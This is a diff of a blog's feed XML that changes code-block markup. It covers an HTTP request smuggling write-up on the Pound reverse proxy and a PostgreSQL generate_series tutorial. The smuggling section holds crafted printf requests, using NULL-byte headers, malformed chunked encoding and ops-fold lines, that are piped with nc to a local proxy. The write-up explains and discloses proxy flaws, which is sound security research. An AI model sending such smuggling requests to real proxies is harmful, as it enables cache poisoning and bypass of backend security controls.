 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Content-\0dummy: foo\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
@@ -257,11 +654,12 @@ Content-Length (very likely).. but had support for NULL characters (less likely)
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
 &lt;p&gt;On each attack we 2 responses instead of 3, you can also make 3 responses instead of 2.&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# 3 responses instead of 2 (2nd query is unmasked by pound)&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# 3 responses instead of 2 (2nd query is unmasked by pound)&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Transfer-\0Mode: magic\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
@@ -279,13 +677,14 @@ Content-Length (very likely).. but had support for NULL characters (less likely)
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
 &lt;p&gt;And if you are still here you can compare the last two examples.
 On the first one we try a bad chunked transmission, and on the last one we use the &lt;code&gt;ops-fold&lt;/code&gt; syntax.
 Use wireshark to compare the behaviors and some potential &lt;em&gt;crafted headers&lt;/em&gt; syntax transmitted to backends.&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# chunk mode not applied&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# chunk mode not applied&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Transfer-\0Mode: magic\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
@@ -303,9 +702,12 @@ Use wireshark to compare the behaviors and some potential &lt;em&gt;crafted head
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# chunk mode applied, and &amp;#39;\r\n zorg\r\n&amp;#39; ops-fold transmitted&lt;/span&gt;
+
+
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# chunk mode applied, and &amp;#39;\r\n zorg\r\n&amp;#39; ops-fold transmitted&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Transfer-\0Mode: magic\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
@@ -324,7 +726,8 @@ Use wireshark to compare the behaviors and some potential &lt;em&gt;crafted head
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
 &lt;h3&gt;5) Transmission issues&lt;/h3&gt;
 
@@ -333,7 +736,7 @@ Usually the Reverse proxy which support ops-fold are not transmitting the syntax
 
 &lt;p&gt;They were other transmission issues like this one (sadly not fixed):&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;GET / HTTP/1.1\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Host:localhost\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Transfer-Encoding: chunked\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;Dummy:Header\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
@@ -346,7 +749,8 @@ Usually the Reverse proxy which support ops-fold are not transmitting the syntax
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;0\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 &lt;span class=&quot;s1&quot;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc -q3 127.0.0.1 8080&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
 &lt;p&gt;This is not an invalid query. The first chunk size is &lt;code&gt;42&lt;/code&gt; in hexa, so 66 bytes.
 The second chunk is the end-of-chunks marker, the last 2 lines &lt;code&gt;0\r\n\r\n&lt;/code&gt;.
@@ -438,7 +842,7 @@ because the Proxy is not doing any splitting, just forwarding some dangerous syn
 
 </description>
 				<published>2018-07-03 00:00:00 +0200</published>
-				<link>http://regilero.github.io/security/english/2018/07/03/security_pound_http_smuggling/</link>
+				<link>http://regilero.github.io/english/security/2018/07/03/security_pound_http_smuggling/</link>
 			</item>
 		
 			<item>
@@ -484,13 +888,14 @@ to test the complex queries in your own database.&lt;/p&gt;
 
 &lt;p&gt;Let&#39;s use &lt;code&gt;generate_series&lt;/code&gt; to generate some data :&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;c1&quot;&gt;-- tall numbers between 1 and 100 (step 1 by default)&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;c1&quot;&gt;-- tall numbers between 1 and 100 (step 1 by default)&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;generate_series&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;-- all dates between 2010/05/10 and now,&lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;-- with a step of 78 days, 15 hours and 10 minutes&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;generate_series&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;2010-10-05 00:00&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;timestamp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                               &lt;span class=&quot;k&quot;&gt;CURRENT_TIMESTAMP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-                              &lt;span class=&quot;s1&quot;&gt;&amp;#39;8 days 15 hours 12min&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
+                              &lt;span class=&quot;s1&quot;&gt;&amp;#39;8 days 15 hours 12min&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
 &lt;p&gt;As we can see this function is quite powerful (&lt;a href=&quot;http://sqlfiddle.com/#!17/9eecb/191&quot;&gt;SQLFidlle1&lt;/a&gt; &lt;a href=&quot;http://sqlfiddle.com/#!17/9eecb/190&quot;&gt;SQLFidlle2&lt;/a&gt;).&lt;/p&gt;
 
@@ -500,28 +905,29 @@ to test the complex queries in your own database.&lt;/p&gt;
 
 &lt;p&gt;Let&#39;s start with &lt;a href=&quot;https://github.com/regilero/regilero.github.com/blob/master/theme/resource/pgserie/feeding_company.sql&quot;&gt;this query&lt;/a&gt; which generates a lot of company names, we&#39;ll use that to feed the &lt;code&gt;company&lt;/code&gt; table:&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;concat_ws&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name_first&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name_last&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;generated&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
         &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string_agg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
         &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start_arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&lt;em&gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start_arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
             &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt;
             &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
                 &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;{CO,GE,FOR,SO,CO,GIM,SE,CO,GE,CA,FRA,GEC,GE,GA,FRO,GIP}&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start_arr&lt;/span&gt;
             &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;syllarr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-            &lt;span class=&quot;c1&quot;&gt;-- need 3 syllabes, and force generator interpretation with the &amp;#39;&lt;/em&gt;0&amp;#39; (else 3 same syllabes)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;generate_series&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&lt;em&gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+            &lt;span class=&quot;c1&quot;&gt;-- need 3 syllabes, and force generator interpretation with the &amp;#39;*0&amp;#39; (else 3 same syllabes)&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;generate_series&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
         &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;comp3syl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;comp_name_1st&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name_first&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&lt;/em&gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
         &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
             &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;{Ltd,&amp;amp; Co,SARL,SA,Gmbh,United,Brothers,&amp;amp; Sons,International,Ext,Worldwide,Global,2000,3000}&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
         &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;comp_name_last&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name_last&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;generate_series&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;generate_series&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;generator&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 
 &lt;p&gt;As we &lt;a href=&quot;http://sqlfiddle.com/#!17/9eecb/186&quot;&gt;can see on SQL Fiddle&lt;/a&gt; this somewhat strange query works and generates 10,000 company names, from 3 syllables and a final word (like &quot;SOCOGEC 2000&quot; or &quot;COGEFOR Worldwide&quot;). &lt;strong&gt;The query does not use any table, there&#39;s not even a model for this in SQL Fiddle.&lt;/strong&gt;&lt;/p&gt;
 
@@ -532,9 +938,10 @@ and not a correlated one, and only on syllables combination would be generated. 
 
 &lt;p&gt;Once we have a good &lt;code&gt;SELECT&lt;/code&gt; we just have to &lt;code&gt;INSERT&lt;/code&gt; the result in the table, using an insert query of this form:&lt;/p&gt;
 
-&lt;p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;matable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;field1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;field2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;matable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;field1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;field2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.....&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- (here the select we just found) ....&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CONFLICT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;DO&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;NOTHING&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;&lt;/p&gt;
